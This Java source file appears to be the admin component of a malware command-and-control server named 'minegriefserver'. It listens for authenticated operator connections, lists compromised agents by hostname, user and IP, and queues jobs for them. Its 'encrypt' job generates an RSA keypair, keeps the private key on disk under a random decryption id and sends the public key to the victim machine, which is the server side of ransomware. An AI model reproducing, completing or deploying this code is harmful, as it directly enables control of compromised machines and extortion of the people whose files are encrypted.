package com.chebuya.minegriefserver.admin;

import com.chebuya.minegriefserver.controller.Agent;
import com.chebuya.minegriefserver.jobs.JobOutput;
import com.chebuya.minegriefserver.jobs.JobRequest;
import com.chebuya.minegriefserver.transport.ServerTransport;

import java.io.IOException;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.*;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import static com.chebuya.minegriefserver.controller.ControllerService.getAgents;
import static com.chebuya.minegriefserver.util.JsonUtils.jsonToMap;
import static com.chebuya.minegriefserver.util.JsonUtils.mapToJson;
import static com.chebuya.minegriefserver.util.Logging.LOGGER;

public class AdminService {
    private final String LIST_AGENTS = "list_agents";
    private final String ADD_JOB = "add_job";
    private final String GET_JOB = "get_job";
    private final String JOB_ACTION = "job_action";
    private final String ACTION = "action";
    private final String JOB_ID = "job_id";
    private final String ARGS = "args";
    private final String STATUS = "status";
    private final String PENDING = "pending";
    private final String COMPLETE = "complete";
    private final String OUTPUT = "output";

    private ServerTransport transport;
    private int port;
    private String ip;

    private Boolean running;
    private ServerSocket serverSocket;
    private ExecutorService executorService;
    private ArrayList<String> authTokens;

    private static ArrayList<JobRequest> jobRequests;
    private static ArrayList<JobOutput> jobOutputs;

    public AdminService(ServerTransport transport, String ip, int port, ArrayList<String> authTokens) {
        this.transport = transport;
        this.ip = ip;
        this.port = port;

        this.authTokens = authTokens;
        this.jobRequests = new ArrayList<JobRequest>();
        this.jobOutputs = new ArrayList<JobOutput>();
    }

    public void Start() {
        this.executorService = Executors.newCachedThreadPool();

        try {
            this.serverSocket = new ServerSocket(port, 0, InetAddress.getByName(ip));
        } catch (IOException e) {
            LOGGER.warning("(admin_controller) could not bind to " + ip + ":" + port + ": " + e.getMessage());
            throw new RuntimeException(e);
        }

        running = true;
        LOGGER.info("(admin_controller) waiting for connections");
        new Thread(() -> acceptClients()).start();
    }

    private void acceptClients() {
        while (running) {
            try {
                Socket clientSocket = serverSocket.accept();
                LOGGER.info("(admin_controller) new client connected: " + clientSocket.getInetAddress());

                executorService.execute(() -> handleClient(clientSocket));

            } catch (IOException e) {
                if (running) {
                    LOGGER.warning("(admin_controller) error accepting client connection: " + e.getMessage());
                }
            }
        }
    }

    private void handleClient(Socket clientSocket) {
        String requestBody = "", responseBody = "";

        try {
            requestBody = transport.untransformData(transport.receiveData(clientSocket));
            LOGGER.info("(admin_controller) request body: " + requestBody);
        } catch (Exception e) {
            LOGGER.warning("(admin_controller) error while receiving data: " + e.getMessage());
            return;
        }

        try {
            responseBody = processRequest(requestBody);
            LOGGER.info("(admin_controller) response body: " + responseBody);
        } catch (SecurityException e) {
            LOGGER.warning("(admin_controller) security violation from " + clientSocket.getLocalAddress() + ":" + clientSocket.getLocalPort());
            try {
                clientSocket.close();
            } catch (IOException ioException) {
                LOGGER.warning("(admin_controller) unable to close socket: " + ioException.getMessage());
            }
            return;
        }

        try {
            transport.transformData(transport.sendData(clientSocket, responseBody));
        } catch (Exception e) {
            LOGGER.warning("(admin_controller) error while sending data: " + e.getMessage());
            return;
        }

        try {
            clientSocket.close();
        } catch (IOException e) {
            LOGGER.warning("(admin_controller) unable to close socket: " + e.getMessage());
            return;
        }
    }

    private String processRequest(String requestBody) throws SecurityException {
        Map<String, String> requestPayload = null, responsePayload = null;

        requestPayload = jsonToMap(requestBody);
        String action = requestPayload.get(ACTION);
        String token = requestPayload.get("token");

        LOGGER.info("(admin_controller) got request: " + action);

        if (!authTokens.contains(token)) {
            LOGGER.warning("(admin_controller) a connection attempt with an invalid token (" + token + ") occurred");
            throw new SecurityException("Access denied");
        }

        responsePayload = new HashMap<String, String>();
        switch (action) {
            case LIST_AGENTS:
                LOGGER.info("(admin_controller) listing agents");
                responsePayload.put(ACTION, action);

                String agents = "[";
                for (Agent agent : getAgents()) {
                    agents += "{";
                    agents += "\"uuid\": \"" + agent.uuid + "\", ";
                    agents += "\"hostname\": \"" + agent.hostname + "\", ";
                    agents += "\"user\": \"" + agent.user + "\", ";
                    agents += "\"ip\": \"" + agent.ip + "\"";
                    agents += "}, ";
                }
                agents += "]";
                agents = agents.replace("}, ]", "}]");

                responsePayload.put(ARGS, Base64.getEncoder().encodeToString(agents.getBytes(StandardCharsets.UTF_8)));
                break;

            case ADD_JOB:
                String uuid = UUID.randomUUID().toString();
                responsePayload.put(ACTION, requestPayload.get(JOB_ACTION));
                responsePayload.put("job_id", uuid);

                String jobAction = requestPayload.get(JOB_ACTION);
                if (jobAction.equals("encrypt")) {
                    KeyPairGenerator generator;
                    try {
                        generator = KeyPairGenerator.getInstance("RSA");
                    } catch (NoSuchAlgorithmException e) {
                        LOGGER.warning("(admin_controller) could not find the requested algorithm");
                        break;
                    }

                    generator.initialize(2048);
                    KeyPair pair = generator.generateKeyPair();

                    PrivateKey privateKey = pair.getPrivate();
                    PublicKey publicKey = pair.getPublic();

                    String decryptionId = getSaltString();

                    try {
                        Files.write(Paths.get(decryptionId + ".txt"), privateKey.getEncoded());
                    } catch (IOException e) {
                        LOGGER.warning("(admin controller) unable to write the decryption file to disk");
                        break;
                    }

                    jobRequests.add(new JobRequest(requestPayload.get("client_id"), uuid, jobAction, requestPayload.get("job_args") + "|" + decryptionId + "|" + Base64.getEncoder().encodeToString(publicKey.getEncoded())));
                } else {
                    jobRequests.add(new JobRequest(requestPayload.get("client_id"), uuid, jobAction, requestPayload.get("job_args")));
                }
                break;
            case GET_JOB:
                String jobId = requestPayload.get("job_id") ;
                responsePayload.put(ACTION, GET_JOB);
                responsePayload.put(JOB_ID, jobId);

                try {
                    JobOutput jobOutput = getJobOutput(requestPayload.get("client_id"), jobId);
                    responsePayload.put(STATUS, COMPLETE);
                    responsePayload.put(OUTPUT, jobOutput.getOutput());
                } catch (NoSuchElementException e) {
                    responsePayload.put(STATUS, PENDING);
                    responsePayload.put(OUTPUT, "");
                }

                break;
            default:
        }

        return mapToJson(responsePayload);
    }


    public static JobRequest getJob(String clientId) throws NoSuchElementException {
        for (JobRequest jobRequest : jobRequests) {

            if (!clientId.equals(jobRequest.getClientId())) {
                continue;
            }

            jobRequests.remove(jobRequest);
            return jobRequest;
        }

        throw new NoSuchElementException("No jobs for " + clientId);
    }

    public JobOutput getJobOutput(String clientId, String jobId) throws NoSuchElementException {
        for (JobOutput jobOutput : jobOutputs) {

            if (!clientId.equals(jobOutput.getClientId())) {
                continue;
            }
            if (!jobId.equals(jobOutput.getJobId())) {
                continue;
            }

            jobOutputs.remove(jobOutput);
            return jobOutput;
        }

        throw new NoSuchElementException("No job outputs for " + clientId);
    }

    public static void putJobOutput(JobOutput jobOutput) {
        jobOutputs.add(jobOutput);
    }

    private static String getSaltString() {
        String SALTCHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() < 8) {
            int index = (int) (rnd.nextFloat() * SALTCHARS.length());
            salt.append(SALTCHARS.charAt(index));
        }
        String saltStr = salt.toString();
        return saltStr;
    }
}
